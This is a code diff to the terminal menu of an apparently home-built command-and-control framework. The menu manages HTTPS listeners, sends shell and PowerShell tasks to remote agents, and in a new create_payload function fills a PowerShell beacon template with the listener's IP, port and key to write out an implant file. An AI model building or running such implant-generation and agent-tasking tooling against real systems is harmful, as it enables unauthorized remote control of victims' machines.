@@ -12,7 +12,7 @@ from ipaddress import ip_address
 from collections import OrderedDict
 from simple_term_menu import TerminalMenu
 
-from os import popen, system
+from os import popen, system, getcwd
 from colorama import Fore, Back, Style
 
 from core.stash import *
@@ -36,8 +36,10 @@ class MainMenu :
         self.CMD = ['shell', 'powershell', 'sleep', 'rename', 'back_to_previous_menu']
 
         self.listener_types = ['HTTPS', 'back']
-        self.listeners = OrderedDict()
+        self.payloads_types = OrderedDict()
+        self.payloads_types['HTTPS'] = ['powershell', 'c++ (soon)']
 
+        self.listeners = OrderedDict()
         ## init listeners still alive
         full_list = self.stash.get_listeners(full=True)
         for ll in full_list:
@@ -70,7 +72,7 @@ class MainMenu :
 
     def print_menu(self):
         system('clear')
-        rows, columns = popen('/usr/bin/stty size', 'r').read().split(' ')
+        rows, columns = popen('/usr/bin/stty size', 'r').read().split()
         # print(f'Rows {rows}')
         # print(f'Columns {columns}')
 
@@ -238,7 +240,7 @@ class MainMenu :
                             self.on_activate_r()
                         else:
                             if am_list_items[am_list_sel] not in ['Back', 'NO ACTIVE AGENTS, you n00b']:
-                                task_input = self.get_task_input(am_list_items[am_list_sel].split(' ')[0])
+                                task_input = self.get_task_input(am_list_items[am_list_sel].split()[0])
                                 
                             am_list_back = True
                             amm_back = True
@@ -261,7 +263,7 @@ class MainMenu :
                             self.on_activate_r()
                         else:
                             if am_list_items[am_kill_sel] not in ['Back', 'NO ACTIVE AGENTS, you n00b']:
-                                agent = am_list_items[am_kill_sel].split(' ')[0]
+                                agent = am_list_items[am_kill_sel].split()[0]
                                 command_code = self.gen_command_code()
                                 cmd = 'quit'
                                 self.stash.set_agent_job(command_code, agent, cmd)
@@ -278,10 +280,11 @@ class MainMenu :
         readline.set_completer(self.cmd_completer)
         header = f'\n\n       Set Task to {agent}. Tab is your friend.'
         cmd = ''
-        while cmd == '' or cmd.split(' ')[0] not in self.CMD:
+        while cmd == '' or cmd.split()[0] not in self.CMD:
             cmd = input(f'{header}\n{Fore.GREEN}{Style.BRIGHT}{self.cursor}{Style.RESET_ALL}')
-        command_code = self.gen_command_code()
-        self.stash.set_agent_job(command_code, agent, cmd)
+        if 'back_to_previous_menu' not in cmd:
+            command_code = self.gen_command_code()
+            self.stash.set_agent_job(command_code, agent, cmd)
 
     def gen_command_code(self):
         command_code = ''.join(choice(ascii_letters) for i in range(10))
@@ -297,7 +300,7 @@ class MainMenu :
     def short_com_hist(self, agent):
         high_comm = f'{Fore.GREEN}{Style.BRIGHT} Task > {Fore.WHITE}'
         high_resp = f'{Fore.CYAN} Result > '
-        comms = self.stash.get_agents_comm_list(agent.split(' ')[0])
+        comms = self.stash.get_agents_comm_list(agent.split()[0])
         ret = '\n'
         for c in comms:
             cra = c[1].replace('\r','').split('\n')
@@ -315,7 +318,7 @@ class MainMenu :
 
         name = f'{Style.BRIGHT}{Fore.GREEN}'
         val = f'{Style.BRIGHT}{Fore.CYAN}'
-        ln = listener_entry.split(' ')[-1]
+        ln = listener_entry.split()[-1]
         listener = self.stash.get_listener(ln)[0]
         agents_list = self.stash.get_agents(ln)
         if agents_list == []:
@@ -400,6 +403,7 @@ class MainMenu :
             accept_keys=('enter', 'ctrl-e', 'ctrl-w')
         )
 
+
         # lmm_sel = lmm.show()
 
         # Listeners menu loop [0-2] ['Show Listeners', 'Kill Listener', 'Back']
@@ -428,10 +432,34 @@ class MainMenu :
                             self.on_activate_r()
                         else:
                             # if lm_list_items[lm_list_sel] not in ['NO ACTIVE LISTENERS', 'Back']:
-                            if lm_list_items[lm_list_sel] not in ['NO ACTIVE LISTENERS', 'Back']:
-                                success('Generating the beacon.')
-                                warning('Nah, just fucking with you')
-                                error('I am not that smart yet :(')
+                            listener_string = lm_list_items[lm_list_sel]
+                            if listener_string not in ['NO ACTIVE LISTENERS', 'Back']:
+                                ## Payload creator menu
+                                payload_menu_title = '\n\n       Choose the payload type\n'
+                                payload_menu_back = False
+                                payload_types_array = self.payloads_types[listener_string.split()[0]]
+                                payload_menu = TerminalMenu(
+                                    menu_entries=payload_types_array,
+                                    title=payload_menu_title,
+                                    menu_cursor=self.cursor,
+                                    menu_cursor_style=self.cursor_style,
+                                    menu_highlight_style=self.h_style,
+                                    cycle_cursor=True,
+                                    clear_screen=False,
+                                    accept_keys=('enter', 'ctrl-e', 'ctrl-w')
+                                    # preview_command=self.listener_preview,
+                                    # preview_size=0.85,
+                                    # preview_title=f'{Style.BRIGHT}Listener Details{Style.RESET_ALL}'
+                                )
+                                while not payload_menu_back:
+                                    payload_menu_sel = payload_menu.show()
+                                    self.create_payload(listener_string.split()[-1], payload_types_array[payload_menu_sel])
+                                    payload_menu_back = True
+
+                                # success('Generating the beacon.')
+                                # warning('Nah, just fucking with you')
+                                # error('I am not that smart yet :(')
+
                             lm_list_back = True
                             lmm_back = True
                             self.print_menu()
@@ -460,8 +488,8 @@ class MainMenu :
                             self.on_activate_r()
                         else:
                             if lm_list_items[lm_kill_sel] not in ['NO ACTIVE LISTENERS', 'Back']:
-                                listener_tokill = lm_list_items[lm_kill_sel].split(' ')[-1]
-                                type_tokill = lm_list_items[lm_kill_sel].split(' ')[0]
+                                listener_tokill = lm_list_items[lm_kill_sel].split()[-1]
+                                type_tokill = lm_list_items[lm_kill_sel].split()[0]
                                 self.stash.sql_stash( 'UPDATE key_store SET alive = ? WHERE list_name = ? ;', (False, listener_tokill) )
                                 self.kill_listener(type_tokill,listener_tokill)
 
@@ -488,7 +516,7 @@ class MainMenu :
             if cmd == '':
                 continue
 
-            exp_cmd = cmd.split(' ')
+            exp_cmd = cmd.split()
             if exp_cmd[0] == 'back':
                 already_running = 0
                 continue
@@ -501,8 +529,8 @@ class MainMenu :
                 else:
                     garbagio,l_name,ip,port = exp_cmd
 
-                    if l_name == 'ALL':
-                        error(f'Nice try fucker!')
+                    if ' ' in l_name:
+                        error(f'No spaces!')
                         already_running = 0
                         continue
 
@@ -510,6 +538,11 @@ class MainMenu :
                         ip_address(ip)
                     except:
                         error(f'Not an IP address')
+                        already_running = 0
+                        continue
+
+                    if '0.0.0.0' == ip:
+                        error('Use the specific IP of one of your ifaces')
                         already_running = 0
                         continue
 
@@ -547,4 +580,25 @@ class MainMenu :
         #     self.listeners[l_name].stop()
         if l_type == 'HTTPS':
             self.listeners[l_name].stop()
-                
+
+    def create_payload(self, name, ptype):
+        listener_info = self.stash.get_listener(name)
+        l_type = listener_info[0][0]
+        l_ip = listener_info[0][1]
+        l_port = listener_info[0][2]
+        l_key = self.stash.get_key(name)[0][0]
+        cwd = getcwd()
+        template_folder = path.join(cwd, 'beacons')
+        out_folder = path.join(cwd, 'payloads')
+        if l_type == 'HTTPS':
+            if ptype == 'powershell':
+                template = path.join(template_folder,'https_beacon.ps1')
+                with open(template,'r') as tr:
+                    temp = tr.read()
+                temp = temp.replace('XXX_listener_ip_placeholder_XXX',l_ip)
+                temp = temp.replace('XXX_listener_port_placeholder_XXX',str(l_port))
+                temp = temp.replace('XXX_listener_key_placeholder_XXX',l_key)
+                final_implant = path.join(out_folder,f'{l_type}_beacon_{name}.ps1')
+                with open(final_implant,'w+') as fw:
+                    fw.write(temp)
+                success(f'The payload is ready --> {final_implant}')
